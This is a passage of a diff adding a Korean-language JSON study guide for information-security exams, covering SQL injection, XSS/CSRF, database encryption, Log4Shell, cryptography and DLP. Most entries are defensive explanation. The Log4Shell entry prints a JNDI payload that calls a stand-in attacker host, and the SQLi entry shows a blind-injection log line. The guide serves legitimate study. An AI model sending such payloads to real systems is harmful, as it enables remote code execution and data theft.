+        "clarification": "Blind SQL Injection은 애초에 에러 메시지가 출력되지 않는 환경을 뚫기 위해 고안된 기법이므로, 에러 숨김은 대책이 될 수 없으며 PreparedStatement가 필수입니다."
+      },
+      {
+        "trap": "MyBatis에서 '${variable}' 사용을 안전한 바인딩이라고 오해",
+        "clarification": "MyBatis에서 '#'은 PreparedStatement 파라미터 바인딩이며, '$'는 단순 문자열 치환(String Replacement)이므로 SQL Injection에 그대로 노출됩니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-APP-02",
+        "target_name": "웹 보안 및 크롤러 배제 표준",
+        "difference": "DB를 목표로 하는 백엔드 쿼리 공격(SQLi)과 브라우저/클라이언트를 목표로 하는 스크립트 실행 공격(XSS, CSRF)"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "Java JDBC Prepared Statement 안전한 코드",
+        "code": "String sql = \"SELECT * FROM members WHERE user_id = ? AND user_pw = ?\";\nPreparedStatement pstmt = conn.prepareStatement(sql);\npstmt.setString(1, userId);\npstmt.setString(2, userPw);\nResultSet rs = pstmt.executeQuery();",
+        "explanation": "플레이스홀더(?)를 사용하여 사용자 입력을 문법이 아닌 단순 데이터 값으로 바인딩합니다."
+      },
+      {
+        "title": "Apache 로그 내 SQL 인젝션 공격 흔적 예시",
+        "code": "192.168.1.100 - - [10/Oct/2026:14:20:15 +0900] \"GET /view.php?id=1'%20AND%20ASCII(SUBSTRING((SELECT%20user()),1,1))=114--%20HTTP/1.1\" 200 4520",
+        "explanation": "Blind SQL Injection 공격자가 SUBSTRING과 ASCII 함수를 이용하여 한 글자씩 유추하는 로그입니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-03",
+        "page_hint": "p.1-7",
+        "relevance": "실기 서술형 TOP 20 - SQL Injection 원리, 로그 분석 및 방어 루브릭"
+      },
+      {
+        "source_id": "SRC-08",
+        "page_hint": "p.45-82",
+        "relevance": "수제비 3과목 애플리케이션 보안 - 웹 취약점 및 시큐어 코딩"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "KISA 소프트웨어 개발보안 가이드 및 OWASP Top 10 최신 기준과 일치합니다."
+    }
+  },
+  "CON-APP-02": {
+    "concept_id": "CON-APP-02",
+    "summary": "클라이언트를 겨냥하는 웹 공격인 XSS(Stored, Reflected, DOM), 사용자 권한을 도용하여 악의적 요청을 전송하는 CSRF, HTTP 응답 분할(CRLF Injection), 그리고 웹 검색엔진 크롤러를 제어하는 robots.txt 표준을 다룹니다.",
+    "core_points": [
+      "XSS(Cross-Site Scripting) 3대 유형: Stored XSS(서버 DB에 스크립트 영구 저장), Reflected XSS(URL 파라미터가 응답에 반사), DOM-based XSS(서버 거치지 않고 브라우저 DOM 조작)",
+      "XSS 방어 대책: HTML Entity 인코딩(&lt;, &gt;, &quot;, &#x27;), 서버 측 입력값 검증, 안전한 라이브러리(Lucy-XSS-Filter), 쿠키 HttpOnly 플래그(세션 탈취 차단)",
+      "CSRF(Cross-Site Request Forgery) 원리: 희생자의 기인증된 브라우저 세션을 도용하여 원치 않는 공격자 요청(비밀번호 변경, 계좌이체 등)을 서버로 전송",
+      "CSRF 방어 대책: 예측 불가능한 CSRF 토큰(Token) 검증, 재인증 요구(비밀번호 재입력/CAPTCHA), SameSite 쿠키 속성(Strict/Lax)",
+      "robots.txt 표준: 검색엔진 로봇에게 사이트 접근 권한을 알리는 규약(User-agent, Disallow, Allow), 절대 보안 솔루션이 아니며 경로 노출의 위험이 존재함"
+    ],
+    "mechanism": "XSS는 공격자가 작성한 악성 스크립트가 희생자의 브라우저에서 실행되어 쿠키 탈취, 키로깅, 악성 사이트 리다이렉션을 유발합니다. 반면 CSRF는 스크립트가 실행되지 않더라도 희생자의 브라우저가 자동으로 포함하는 쿠키(세션)를 악용하여 위조된 HTTP 요청을 대상 서버가 신뢰하도록 만듭니다.",
+    "exam_points": [
+      "XSS와 CSRF의 핵심 차이점(스크립트 실행 주체 및 목적) 비교 서술",
+      "CSRF 방어 시 단순 Referer 헤더 검증의 취약점과 CSRF Token의 검증 원리 서술",
+      "robots.txt 파일 작성 문법(User-agent: *, Disallow: /admin/) 및 정보 유출 위험성 서술",
+      "HTTP 응답 분할(CRLF Injection)의 원리(\\r\\n을 이용한 가짜 헤더/본문 삽입)와 방어책"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "robots.txt 파일에 기밀 디렉터리를 Disallow로 등록하면 안전하게 보호된다고 서술",
+        "clarification": "robots.txt는 선의의 로봇에 대한 권고일 뿐 강제력이 없으며, 악의적인 공격자에게는 오히려 관리자 페이지나 기밀 경로를 알려주는 정보 수집(Footprinting) 수단이 됩니다."
+      },
+      {
+        "trap": "HttpOnly 쿠키 설정이 CSRF 공격을 방어한다고 기술",
+        "clarification": "HttpOnly는 자바스크립트의 document.cookie 접근을 막아 XSS를 통한 세션 탈취를 방어하지만, 브라우저가 자동으로 쿠키를 첨부하는 CSRF 공격은 전혀 방어하지 못합니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-APP-01",
+        "target_name": "웹 애플리케이션 취약점 및 웹서버 분석",
+        "difference": "서버 DB 엔진에 직접 악성 쿼리를 주입하는 SQLi와 대비되는 사용자 브라우저 컨텍스트 공격(XSS) 및 요청 위조(CSRF)"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "안전한 robots.txt 설정 예시",
+        "code": "User-agent: *\nDisallow: /admin/\nDisallow: /backup/\nAllow: /",
+        "explanation": "모든 웹 크롤러에 대해 /admin/과 /backup/ 디렉터리의 인덱싱을 제한합니다."
+      },
+      {
+        "title": "Set-Cookie 보안 속성 적용 예시",
+        "code": "Set-Cookie: SESSIONID=abc123xyz; Path=/; Secure; HttpOnly; SameSite=Strict",
+        "explanation": "HTTPS 환경에서만 전송(Secure), JS 접근 차단(HttpOnly), 외부 사이트 요청 시 쿠키 전송 차단(SameSite=Strict)을 동시 적용합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-08",
+        "page_hint": "p.95-130",
+        "relevance": "수제비 3과목 애플리케이션 보안 - XSS, CSRF, robots.txt 이론"
+      },
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.42-45",
+        "relevance": "XSS 유형 및 robots.txt 문법 기출 단답형 문제"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "W3C 표준 및 KISA 시큐어코딩 가이드와 완벽히 일치합니다."
+    }
+  },
+  "CON-APP-03": {
+    "concept_id": "CON-APP-03",
+    "summary": "개인정보 및 기밀 데이터 보호를 위한 데이터베이스 암호화의 3대 핵심 구현 방식(API, Plug-in, TDE/커널 방식)의 아키텍처, 성능 영향, 보안성 장단점, 그리고 안전한 파라미터 바인딩 원리를 다룹니다.",
+    "core_points": [
+      "DB 암호화 3대 방식: API 방식(애플리케이션 서버에서 암/복호화), Plug-in 방식(DB 서버 엔진 내부 플러그인에서 암/복호화), TDE/커널 방식(스토리지/OS 블록 레벨 투명 암호화)",
+      "API 방식 특성: 애플리케이션 서버에서 암호화되므로 전송 구간 암호화 효과 발생, 애플리케이션 소스코드 수정 필요, 서버 CPU 부하 분산",
+      "Plug-in 방식 특성: DB 서버 내부에서 수행되므로 애플리케이션 수정이 최소화됨, DB 서버 부하 증가 및 DB 관리자(DBA)에 의한 평문 조회 위험 통제 필요",
+      "TDE(Transparent Data Encryption) 방식: DBMS 커널 및 파일 I/O 레벨에서 투명하게 암호화, 소스코드 수정 전무, 인덱스 검색 성능 저하 최소화",
+      "DB 암호화 대상: 개인정보보호법상 고유식별정보(주민등록번호, 여권번호 등), 비밀번호(일방향), 바이오정보"
+    ],
+    "mechanism": "API 방식은 암호화된 상태로 네트워크를 통해 DB로 전달되므로 DB 스니핑에 안전합니다. Plug-in 방식은 SQL 호출 시 뷰(View)나 트리거를 통해 플러그인 모듈이 동작하며, TDE는 데이터 파일(Tablespace)이 디스크에 쓰여질 때 자동 암호화되고 메모리로 읽힐 때 자동 복호화됩니다.",
+    "exam_points": [
+      "DB 암호화 3대 방식(API, Plug-in, TDE/커널)의 명칭 및 각각의 아키텍처 위치 비교 서술",
+      "소스코드 수정 여부 관점 비교: API 방식(수정 필요) vs Plug-in/TDE(수정 거의 없음/전무)",
+      "DB 서버의 부하 관점 비교: API 방식(부하 분산) vs Plug-in 방식(DB 부하 집중)",
+      "개인정보보호법 안전성 확보조치 기준에 따른 암호화 대상 항목(고유식별정보, 비밀번호 등) 단답형 기출"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "TDE 방식이 전송 구간(Application <-> DB)까지 암호화한다고 오해",
+        "clarification": "TDE는 디스크 스토리지에 저장되는 파일(Data at Rest)을 암호화하는 기법이므로, 네트워크 전송 구간은 여전히 평문이며 SSL/TLS 전송 암호화가 별도로 필요합니다."
+      },
+      {
+        "trap": "비밀번호를 양방향 복호화 가능한 TDE나 대칭키로 암호화한다고 기술",
+        "clarification": "개인정보보호법상 비밀번호는 절대 복호화되어서는 안 되며, Salt를 적용한 안전한 일방향(단방향) 해시 알고리즘(SHA-256 등)으로 저장해야 합니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-APP-01",
+        "target_name": "웹 애플리케이션 취약점 및 웹서버 분석",
+        "difference": "쿼리 인젝션 차단과 대비되는 영구 저장소 데이터(Data at Rest)의 암호학적 기밀성 보호 기법"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "Oracle TDE (Transparent Data Encryption) 활성화 구문",
+        "code": "ALTER SYSTEM SET ENCRYPTION KEY AUTHENTICATED BY \"WalletPassword123!\";\nCREATE TABLESPACE secure_ts ENCRYPTION USING 'AES256' DEFAULT STORAGE(ENCRYPT);",
+        "explanation": "월렛 마스터 키를 기반으로 테이블스페이스 전체를 AES-256으로 자동 투명 암호화합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.46-50",
+        "relevance": "DB 암호화 3대 방식 장단점 기출 단답 및 서술형 문제"
+      },
+      {
+        "source_id": "SRC-08",
+        "page_hint": "p.280-305",
+        "relevance": "수제비 3과목 - 데이터베이스 보안 및 암호화 구축 이론"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "개인정보보호위원회 개인정보의 안전성 확보조치 기준과 완벽히 부합합니다."
+    }
+  },
+  "CON-APP-04": {
+    "concept_id": "CON-APP-04",
+    "summary": "오픈소스 서드파티 라이브러리의 보안 결함 및 소프트웨어 공급망(Supply Chain) 공격, 특히 Apache Log4j 취약점(Log4Shell, CVE-2021-44228)의 JNDI Lookup 메커니즘과 원격 코드 실행(RCE) 원리 및 대응 방안을 다룹니다.",
+    "core_points": [
+      "Log4Shell(CVE-2021-44228) 개요: Apache Log4j 2 라이브러리의 메시지 룩업(Lookup) 기능 결함으로 인한 비인증 원격 코드 실행(RCE) 치명적 취약점",
+      "JNDI(Java Naming and Directory Interface): Java 애플리케이션이 네이밍/디렉터리 서비스(LDAP, RMI, DNS)를 통해 데이터와 객체를 동적으로 검색하고 로드하는 인터페이스",
+      "공격 페이로드 구조: ${jndi:ldap://attacker.com/Exploit}",
+      "공격 완화 및 조치: Log4j 최신 보안 패치(2.17.1 이상), JndiLookup.class 파일 제거, JVM 옵션(-Dlog4j2.formatMsgNoLookups=true) 설정, 외부 LDAP/RMI 아웃바운드 포트 방화벽 차단",
+      "소프트웨어 공급망 보안: SBOM(Software Bill of Materials) 도입을 통한 오픈소스 의존성 추적 및 SCA(Software Composition Analysis) 도구 활용"
+    ],
+    "mechanism": "취약한 Log4j 버전은 로그 메시지 내에 `${jndi:...}` 패턴이 포함되어 있으면 이를 단순 문자열로 남기지 않고 JNDI 인터페이스를 통해 파싱합니다. 공격자가 지정한 원격 LDAP/RMI 서버로 요청을 보내어 악성 Java 클래스를 다운로드받아 서버 메모리에서 인스턴스화함으로써 최고 권한의 임의 코드가 실행됩니다.",
+    "exam_points": [
+      "Log4j 취약점의 핵심 원인 기술인 JNDI(Java Naming and Directory Interface) 명칭 단답형 기출",
+      "공격자가 전송하는 페이로드(`${jndi:ldap://...}`)의 구성 요소 분석",
+      "패치 전 긴급 임시 조치 2가지(JndiLookup.class 제거, formatMsgNoLookups JVM 시스템 속성 설정) 서술",
+      "소프트웨어 자재명세서(SBOM)의 개념 및 공급망 보안 강화 목적 서술"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "Log4j 취약점을 단순한 로그 파일 인젝션(Log Injection/CRLF)으로 오해",
+        "clarification": "단순 로그 위조가 아니라, 로그를 기록하는 과정에서 원격 악성 클래스를 로드하여 실행하는 치명적인 원격 코드 실행(RCE) 취약점입니다."
+      },
+      {
+        "trap": "방화벽 인바운드 차단만으로 조치 완료된다고 서술",
+        "clarification": "공격 패킷은 일반 웹 요청(HTTP 80/443 헤더)을 통해 들어오므로 인바운드 차단이 어렵고, 서버가 공격자 LDAP 서버로 접속하는 아웃바운드(egress) 차단 및 내부 라이브러리 조치가 필수입니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-APP-01",
+        "target_name": "웹 애플리케이션 취약점 및 웹서버 분석",
+        "difference": "직접 구현한 웹 비즈니스 로직 결함(SQLi)과 대비되는 서드파티 오픈소스 의존성 컴포넌트(Log4j) 자체의 공급망 결함"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "Log4j JndiLookup 클래스 수동 제거 조치",
+        "code": "zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class",
+        "explanation": "jar 파일 내에서 취약점을 유발하는 JndiLookup 클래스 바이너리를 물리적으로 삭제합니다."
+      },
+      {
+        "title": "JVM 시작 옵션 완화책 적용",
+        "code": "java -Dlog4j2.formatMsgNoLookups=true -jar myapp.jar",
+        "explanation": "로그 포맷 내 메시지 룩업 기능을 비활성화하여 원격 조회를 차단합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.51-54",
+        "relevance": "Log4j 취약점 및 JNDI 인터페이스 기출 단답형 문제"
+      },
+      {
+        "source_id": "SRC-08",
+        "page_hint": "p.320-335",
+        "relevance": "수제비 3과목 - 오픈소스 컴포넌트 보안 및 RCE 대응"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "KISA 보안공지 및 CVE-2021-44228 공식 대응 지침과 일치합니다."
+    }
+  },
+  "CON-CRY-01": {
+    "concept_id": "CON-CRY-01",
+    "summary": "현대 암호학의 양대 축인 대칭키 암호(블록 암호, 스트림 암호)와 공개키(비대칭키) 암호 시스템의 구조적 특성, 블록 암호 운영 모드(ECB, CBC, CTR, GCM), 그리고 Diffie-Hellman 키 교환 프로토콜을 다룹니다.",
+    "core_points": [
+      "대칭키 vs 비대칭키: 대칭키(암·복호화 키 동일, 빠른 연산 속도, 대량 데이터 암호화 적합, 키 분배/관리 어려움) vs 비대칭키(공개키/개인키 쌍, 느린 속도, 키 분배 용이, 전자서명/키교환 활용)",
+      "주요 대칭키 블록 알고리즘: AES(Rijndael, 128/192/256비트 키, 128비트 블록), SEED(국산, 128비트 Feistel), ARIA(국산, SPN 구조)",
+      "블록 암호 운영 모드: ECB(가장 취약, 패턴 노출), CBC(이전 암호문 블록과 XOR 후 암호화, IV 필수), CTR(카운터를 암호화하여 평문과 XOR, 병렬화 가능), GCM(CTR 모드 + GMAC, 인증 암호화 AEAD 제공)",
+      "Diffie-Hellman 키 교환: 이산대수 문제의 어려움에 기반하여 도청이 가능한 공개 채널에서 안전하게 비밀 세션키를 공유하는 알고리즘",
+      "비대칭키 주요 알고리즘: RSA(소인수분해 문제), ECC(타원곡선 이산대수, 짧은 키 길이로 높은 안전성), ElGamal"
+    ],
+    "mechanism": "블록 암호는 고정된 크기(예: 128비트) 단위로 데이터를 처리합니다. CBC 모드는 각 평문 블록을 직전 암호문 블록과 XOR한 후 암호화하므로 동일한 평문이라도 다른 암호문이 생성되지만 순차 연산만 가능합니다. CTR 모드는 카운터 값을 블록 암호로 암호화한 후 평문과 XOR하므로 암/복호화가 완전 대칭이며 완벽한 병렬 연산이 가능합니다.",
+    "exam_points": [
+      "블록 암호 운영 모드 4종(ECB, CBC, CTR, GCM)의 동작 특성 및 오류 전파(Error Propagation) 비교 서술",
+      "AES, SEED, ARIA의 블록 크기(전부 128비트)와 구조(Feistel vs SPN) 단답형 기출",
+      "Diffie-Hellman 키 교환의 수학적 원리(이산대수 문제) 및 중간자 공격(MITM) 취약점(인증 부재) 서술",
+      "인증 암호화(AEAD)로서 GCM 모드가 제공하는 2대 보안 기능(기밀성 + 무결성/인증)"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "ECB 모드가 초기화 벡터(IV)를 필요로 한다고 기술",
+        "clarification": "ECB(Electronic Codebook) 모드는 각 블록을 독립적으로 암호화하므로 초기화 벡터(IV)를 전혀 사용하지 않으며, 이로 인해 동일한 평문 블록이 항상 동일한 암호문 블록으로 치환되어 패턴이 노출됩니다."
+      },
+      {
+        "trap": "Diffie-Hellman 키 교환 프로토콜 자체가 상호 인증을 제공한다고 기술",
+        "clarification": "순수 Diffie-Hellman은 키 공유 알고리즘일 뿐 상대방의 신원을 검증하지 않으므로, 공격자가 중간에 끼어드는 중간자 공격(Man-in-the-Middle)에 취약하며 디지털 서명이나 PKI 결합이 필수적입니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-CRY-02",
+        "target_name": "해시 함수, 전자서명 및 PKI",
+        "difference": "데이터의 기밀성 보장을 위한 대칭/공개키 암호화와 대비되는 데이터의 무결성 검증 및 신원 부인방지를 위한 단방향 해시/전자서명"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "OpenSSL을 이용한 AES-256-CBC 파일 암호화",
+        "code": "openssl enc -aes-256-cbc -salt -in plain.txt -out secret.enc -iv 0123456789ABCDEF0123456789ABCDEF -K 0123...KEY",
+        "explanation": "128비트 IV와 256비트 대칭키를 이용하여 파일을 안전한 CBC 모드로 암호화합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-09",
+        "page_hint": "p.32-68",
+        "relevance": "수제비 5과목 암호학 - 블록 암호 모드 및 공개키 알고리즘 이론"
+      },
+      {
+        "source_id": "SRC-12",
+        "page_hint": "p.50-58",
+        "relevance": "정보보안기사 실기 전과목 요약 - 암호 알고리즘 비교표"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "NIST SP 800-38A/38D 및 KISA 암호이용가이드 표준과 일치합니다."
+    }
+  },
+  "CON-CRY-02": {
+    "concept_id": "CON-CRY-02",
+    "summary": "데이터의 무결성을 검증하는 일방향 해시 함수(SHA-2/3), 비대칭키를 결합한 전자서명의 생성 및 검증 절차, 그리고 공개키의 진위성을 보증하는 공인인증 체계(PKI)와 인증서 폐기 검증 메커니즘(CRL, OCSP)을 다룹니다.",
+    "core_points": [
+      "일방향 해시 함수 3대 특성: 프리이미지 저항성(역상 저항성, h(x)에서 x 유추 불가), 제2 프리이미지 저항성(약한 충돌 저항성, x와 동일한 h(x)=h(x')인 x' 찾기 불가), 충돌 저항성(강한 충돌 저항성, h(x)=h(y)인 임의의 쌍 찾기 불가)",
+      "전자서명(Digital Signature) 절차: 송신자가 메시지 해시값을 '송신자 개인키'로 암호화하여 서명문 생성 → 수신자가 '송신자 공개키'로 서명을 복호화하여 계산된 원문 해시값과 대조 검증",
+      "전자서명의 3대 기능: 메시지 무결성 검증, 송신자 인증(신원 확인), 송신 사실 부인방지(Non-repudiation)",
+      "PKI(공개키 기반구조) 구성: CA(인증기관), RA(등록기관), CRL(인증서 폐기 목록), 저장소",
+      "인증서 상태 검증: CRL(주기적 블랙리스트 다운로드, 실시간성 결여, 트래픽 부담) vs OCSP(온라인 인증서 상태 프로토콜, 실시간 조회, 단일 요청-응답)"
+    ],
+    "mechanism": "원문 메시지는 길이가 가변적이므로 비대칭키로 직접 암호화하면 매우 느립니다. 따라서 고정 길이(예: 256비트)의 해시값을 먼저 추출한 후 송신자의 개인키로 서명(Sign)합니다. 수신자는 공인인증서에 등록된 송신자의 공개키로 서명을 복호화(Verify)하여 원문의 해시값과 일치하는지 비교함으로써 변조 여부와 서명자를 입증합니다.",
+    "exam_points": [
+      "전자서명 생성 시 사용하는 키(송신자 개인키)와 검증 시 사용하는 키(송신자 공개키) 명확한 구분",
+      "해시 함수의 3대 보안 특성(프리이미지 저항성, 제2 프리이미지 저항성, 충돌 저항성) 개념 서술",
+      "인증서 유효성 검증 방식인 CRL과 OCSP의 메커니즘 및 장단점 비교 서술",
+      "X.509 표준 인증서의 필수 포함 항목(발급자, 유효기간, 주체 공개키, 서명 알고리즘 등) 단답형"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "전자서명 생성 시 수신자의 공개키를 사용한다고 서술",
+        "clarification": "수신자의 공개키는 '데이터 기밀성 암호화'에 사용되며, '전자서명 생성'은 반드시 서명자 본인의 신원을 입증해야 하므로 송신자의 개인키를 사용합니다."
+      },
+      {
+        "trap": "CRL이 실시간 인증서 폐기 상태를 제공한다고 기술",
+        "clarification": "CRL(Certificate Revocation List)은 주기적으로 발행되는 정적 파일이므로 다음 갱신 주기 전까지의 폐기 상태를 반영하지 못하며, 실시간 검증은 OCSP가 담당합니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-CRY-01",
+        "target_name": "대칭키 및 공개키 암호 시스템",
+        "difference": "메시지 기밀성(내용 은폐) 보장과 대비되는 메시지 무결성, 출처 인증, 부인방지 보장 메커니즘"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "OpenSSL을 이용한 SHA-256 해시 생성 및 서명",
+        "code": "openssl dgst -sha256 -sign user_private.key -out signature.bin document.pdf\nopenssl dgst -sha256 -verify user_public.key -signature signature.bin document.pdf",
+        "explanation": "문서의 SHA-256 해시를 개인키로 서명하고, 공개키로 서명의 정당성을 검증합니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-09",
+        "page_hint": "p.75-110",
+        "relevance": "수제비 5과목 - 해시 함수, 전자서명 및 PKI 메커니즘"
+      },
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.55-58",
+        "relevance": "전자서명 키 매핑 및 CRL/OCSP 비교 기출 단답형 문제"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "전자서명법 및 ITU-T X.509 / RFC 5280 표준과 일치합니다."
+    }
+  },
+  "CON-CRY-03": {
+    "concept_id": "CON-CRY-03",
+    "summary": "암호 시스템의 안전성을 평가하고 공격자의 지식 수준에 따라 분류하는 4대 현대 암호 분석(해독) 공격 모델(COA, KPA, CPA, CCA)의 정의와 공격 시나리오를 체계적으로 다룹니다.",
+    "core_points": [
+      "암호 분석 4대 공격 모델: 공격자가 확보할 수 있는 정보의 양과 암호화 장비에 대한 통제 권한에 따라 4단계로 분류",
+      "1. COA(Ciphertext-Only Attack, 암호문 단독 공격): 오직 도청된 여러 개의 '암호문(C)'만을 가지고 평문(P)이나 비밀키(K)를 찾아내는 가장 수동적이고 어려운 공격",
+      "2. KPA(Known-Plaintext Attack, 알려진 평문 공격): 특정 '평문(P)'과 그에 대응하는 '암호문(C)' 쌍을 이미 알고 있는 상태에서 다른 암호문의 평문이나 비밀키를 유추하는 공격",
+      "3. CPA(Chosen-Plaintext Attack, 선택 평문 공격): 공격자가 '자신이 선택한 임의의 평문(P)'을 암호화 장비에 주입하여 대응하는 '암호문(C)'을 획득할 수 있는 권한을 가진 공격",
+      "4. CCA(Chosen-Ciphertext Attack, 선택 암호문 공격): 공격자가 '자신이 선택한 임의의 암호문(C)'을 복호화 장비에 주입하여 대응하는 '평문(P)'을 획득할 수 있는 가장 강력한 능동적 공격"
+    ],
+    "mechanism": "공격자의 공격 강도는 COA < KPA < CPA < CCA 순으로 강력해집니다. 현대 암호 알고리즘은 가장 강력한 적을 가정한 CCA(선택 암호문 공격) 환경에서도 평문이나 키를 알아낼 수 없어야 안전한 암호(IND-CCA 보안성)로 인정받습니다.",
+    "exam_points": [
+      "암호 해독 공격 4대 유형의 영문 약어(COA, KPA, CPA, CCA) 및 한글 명칭 매핑",
+      "각 공격 모델에서 공격자가 소유하고 있거나 제어할 수 있는 정보(평문/암호문/장비 접근 권한)의 차이점 서술",
+      "CPA와 CCA의 결정적 차이(암호화 장비 접근권 vs 복호화 오라클 접근권) 비교",
+      "생일 역설(Birthday Paradox)을 이용한 생일 공격(Birthday Attack)의 대상(해시 함수 충돌 저항성)"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "KPA와 CPA를 동일하게 '평문과 암호문을 알고 있는 상태'로 뭉뚱그려 기술",
+        "clarification": "KPA는 이미 주어진 고정된 평문-암호문 쌍을 수동적으로 알고 있는 것이며, CPA는 공격자가 원하는 임의의 평문을 직접 선택하여 암호화 장치에 넣고 결과를 관찰할 수 있는 능동적 권한이 있습니다."
+      },
+      {
+        "trap": "CCA 공격자가 비밀 복호화 키 자체를 이미 알고 있다고 착각",
+        "clarification": "CCA 공격자는 키를 모릅니다. 단지 복호화 블랙박스(오라클)에 임의의 암호문을 넣어서 평문 결과를 얻어낼 수 있는 환경을 악용하여 최종 비밀키나 특정 목표 암호문을 해독하는 것입니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-CRY-01",
+        "target_name": "대칭키 및 공개키 암호 시스템",
+        "difference": "알고리즘 설계 및 운영 모드와 대비되는 공격자의 위협 모델 및 암호 분석학적 평가 기준"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "공격 모델별 공격자 보유 자원 비교표",
+        "code": "COA: [암호문 C1, C2, ...]\nKPA: [평문 P1 - 암호문 C1], [평문 P2 - 암호문 C2] 고정 쌍\nCPA: 공격자가 선택한 평문 P_x -> [암호화 오라클] -> C_x 획득 가능\nCCA: 공격자가 선택한 암호문 C_y -> [복호화 오라클] -> P_y 획득 가능",
+        "explanation": "시험에 빈출되는 4대 암호 분석 모델의 공격자 보유 자원 및 권한 요약입니다."
+      }
+    ],
+    "related_sources": [
+      {
+        "source_id": "SRC-09",
+        "page_hint": "p.12-25",
+        "relevance": "수제비 5과목 - 현대 암호학 암호 분석 및 공격 기법"
+      },
+      {
+        "source_id": "SRC-01",
+        "page_hint": "p.59-62",
+        "relevance": "COA, KPA, CPA, CCA 정의 및 기출 단답형 문제"
+      }
+    ],
+    "law_review_status": {
+      "status": "source_current",
+      "effective_year": "2024",
+      "note": "현대 암호학 학술 표준 위협 모델(NIST, IACR)과 일치합니다."
+    }
+  },
+  "CON-SEC-01": {
+    "concept_id": "CON-SEC-01",
+    "summary": "엔드포인트 및 네트워크 경계에서 기밀 데이터의 무단 반출을 차단하는 데이터 유출 방지(DLP, Data Loss Prevention) 솔루션의 아키텍처, 매체 제어 기술, 그리고 개인정보 패턴 필터링 메커니즘을 다룹니다.",
+    "core_points": [
+      "DLP(Data Loss Prevention) 핵심 기능: 저장 데이터(Data at Rest), 사용 중 데이터(Data in Use), 전송 중 데이터(Data in Motion)의 이동 흐름을 모니터링하고 정책 기반으로 유출을 차단",
+      "엔드포인트 DLP: 사용자 PC에 에이전트를 설치하여 USB, 외장하드, 블루투스, CD-RW, 프린터 출력, 화면 캡처, 클립보드 복사 등 매체/경로 제어",
+      "네트워크 DLP: 게이트웨이 구간에서 이메일(SMTP), 웹 메일/게시판(HTTP/HTTPS), 메신저, FTP 등의 아웃바운드 트래픽을 검사하여 개인정보 포함 시 차단",
+      "개인정보 패턴 매칭: 정규표현식(Regex)을 통한 주민등록번호, 외국인등록번호, 계좌번호, 카드번호 탐지 및 유효성 검증 알고리즘(Luhn 등) 적용",
+      "DLP 한계 및 보완: 암호화된 압축파일, 스테가노그래피를 통한 우회 위험이 존재하므로 DRM(문서보안) 및 SSL 가시성 장비와 연계 필요"
+    ],
+    "mechanism": "DLP 엔진은 파일이나 패킷이 외부로 전송될 때 컨텐츠를 실시간으로 파싱합니다. 텍스트 추출 및 정규식 검사를 통해 사전에 정의된 임계치(예: 주민등록번호 3건 이상 포함)를 초과하면 전송을 즉시 차단(Block)하고 관리자에게 알람을 발송하며 원본 증적을 암호화하여 저장합니다.",
+    "exam_points": [
+      "DLP 솔루션의 3대 데이터 보호 상태(Data at Rest, Data in Use, Data in Motion) 서술",
+      "DLP와 DRM(Digital Rights Management)의 기능적 차이점 비교 서술",
+      "엔드포인트 매체제어(USB 등) 및 화면 캡처 방지 기능의 동작 목적 서술",
+      "개인정보 필터링 시 정규표현식 적용 및 오탐(False Positive) 방지 방안"
+    ],
+    "common_mistakes": [
+      {
+        "trap": "DLP가 문서 자체를 암호화하여 외부로 나가도 열람하지 못하게 한다고 기술",
+        "clarification": "문서 파일 자체를 암호화하여 인가된 권한자만 열람할 수 있도록 보호하는 것은 DRM의 역할이며, DLP는 데이터의 유출 경로(USB, 메일 등)를 감시하고 전송을 차단하는 솔루션입니다."
+      }
+    ],
+    "compare_with": [
+      {
+        "target_concept_id": "CON-SEC-02",
+        "target_name": "디지털 포렌식 및 침해사고 증거 분석",
+        "difference": "사전 예방 및 실시간 유출 차단(DLP)과 대비되는 사후 침해사고 원인 규명 및 법적 증거 수집(포렌식)"
+      }
+    ],
+    "commands_or_examples": [
+      {
+        "title": "DLP 개인정보 탐지 정규표현식 예시 (주민등록번호)",
+        "code": "\\b[0-9]{2}(0[1-9]|1[0-2])(0[1-9]|[12][0-9]|3[01])-[1-4][0-9]{6}\\b",
